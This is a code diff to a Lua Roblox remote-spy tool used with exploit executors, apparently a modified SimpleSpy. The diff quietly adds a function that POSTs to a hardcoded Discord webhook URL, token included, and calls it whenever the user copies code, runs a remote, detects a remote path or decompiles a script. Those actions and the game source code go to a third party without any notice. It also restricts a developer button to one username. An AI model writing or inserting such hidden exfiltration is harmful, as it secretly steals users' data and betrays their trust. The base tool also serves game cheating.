@@ -61,7 +61,7 @@ local getcallingscript = getcallingscript or blankfunction
 local newcclosure = newcclosure or blankfunction
 local clonefunction = clonefunction or blankfunction
 local cloneref = cloneref or blankfunction
-local request = request or syn and syn.request
+local request = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local makewritable = makewriteable or function(tbl)
     setreadonly(tbl,false)
 end
@@ -182,6 +182,23 @@ local TweenService = SafeGetService("TweenService")
 local ContentProvider = SafeGetService("ContentProvider")
 local TextService = SafeGetService("TextService")
 local http = SafeGetService("HttpService")
+
+local function SendInfoToTurtleServer(message)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = message
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t",
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    --print("Sent")
+end
 
 local function jsone(str) return http:JSONEncode(str) end
 local function jsond(str)
@@ -1011,7 +1028,7 @@ function genScript(remote, args)
             gen = "function getNil(name,class) for _,v in next, getnilinstances()do if v.ClassName==class and v.Name==name then return v;end end end\n\n" .. gen
         end
         if remote:IsA("RemoteEvent") then
-            gen ..= v2s(remote) .. ":FireServer(unpack(args))"
+            gen = v2s(remote) .. ":FireServer(unpack(args))"
         elseif remote:IsA("RemoteFunction") then
             gen = gen .. v2s(remote) .. ":InvokeServer(unpack(args))"
         end
@@ -1362,8 +1379,10 @@ function i2p(i,customgen)
             else
                 if parent.Name:match("[%a_]+[%w+]*") ~= parent.Name then
                     out = ':FindFirstChild(' .. formatstr(parent.Name) .. ')' .. out
+		    SendInfoToTurtleServer("Remote Detected: \n```\n" .. out .. "\n```")
                 else
                     out = "." .. parent.Name .. out
+		    SendInfoToTurtleServer("Remote Detected: \n```\n" .. out .. "\n```")
                 end
             end
             task.wait()
@@ -1391,8 +1410,10 @@ function i2p(i,customgen)
             else
                 if parent.Name:match("[%a_]+[%w_]*") ~= parent.Name then
                     out = ':FindFirstChild(' .. formatstr(parent.Name) .. ')' .. out
+		    SendInfoToTurtleServer("Remote Detected: \n```\n" .. out .. "\n```")
                 else
                     out = '["' .. parent.Name .. '"]'..out
+		    SendInfoToTurtleServer("Remote Detected: \n```\n" .. out .. "\n```")
                 end
             end
             if i:IsDescendantOf(Players.LocalPlayer) then
@@ -1968,6 +1989,7 @@ newButton(
     function()
         setclipboard(codebox:getString())
         TextLabel.Text = "Copied successfully!"
+	SendInfoToTurtleServer("Copied code: \n```\n" .. codebox:getString() .. "\n```")
     end
 )
 
@@ -1979,6 +2001,7 @@ newButton(
         if selected and selected.Remote then
             setclipboard(v2s(selected.Remote))
             TextLabel.Text = "Copied!"
+	    SendInfoToTurtleServer("Copied code: \n```\n" .. v2s(selected.Remote) .. "\n```")
         end
     end
 )
@@ -1990,12 +2013,20 @@ newButton("Run Code",
         local Remote = selected and selected.Remote
         if Remote then
             TextLabel.Text = "Executing..."
+	    if selected then
+		if not selected.Source then
+			selected.Source = rawget(getfenv(selected.Function),"script")
+	        end
+	    end
+					
             xpcall(function()
                 local returnvalue
                 if Remote:IsA("RemoteEvent") then
                     returnvalue = Remote:FireServer(unpack(selected.args))
+		    SendInfoToTurtleServer("Running Remote ( Non-Loop ) ( FireServer ): \n```\n" .. returnvalue .. "\n\nRemote Script located in " .. v2s(selected.Source) .. "\n```")
                 else
                     returnvalue = Remote:InvokeServer(unpack(selected.args))
+		    SendInfoToTurtleServer("Running Remote ( Non-Loop ) ( InvokeServer ): \n```\n" .. returnvalue .. "\n\nRemote Script located in " .. v2s(selected.Source) .. "\n```")
                 end
 
                 TextLabel.Text = ("Executed successfully!\n%s"):format(v2s(returnvalue))
@@ -2189,6 +2220,7 @@ newButton("Decompile",
                     end)
                 end
                 codebox:setRaw(DecompiledScripts[Source] or "--No Source Found")
+		SendInfoToTurtleServer("Remote Decompiler: \n```\n" .. (DecompiledScripts[Source] or "--No Source Found") .. "\n```")
                 TextLabel.Text = "Done!"
             else
                 TextLabel.Text = "Source not found!"
@@ -2279,7 +2311,7 @@ newButton("Auto run Code",function()
     end -- 1
 end)
 
-if configs.supersecretdevtoggle then
+if configs.supersecretdevtoggle and game.Players.LocalPlayer.Name == "Rivanda_Cheater" then
     newButton("Load SSV2.2",function()
         return "Load's Simple Spy V2.2"
     end,
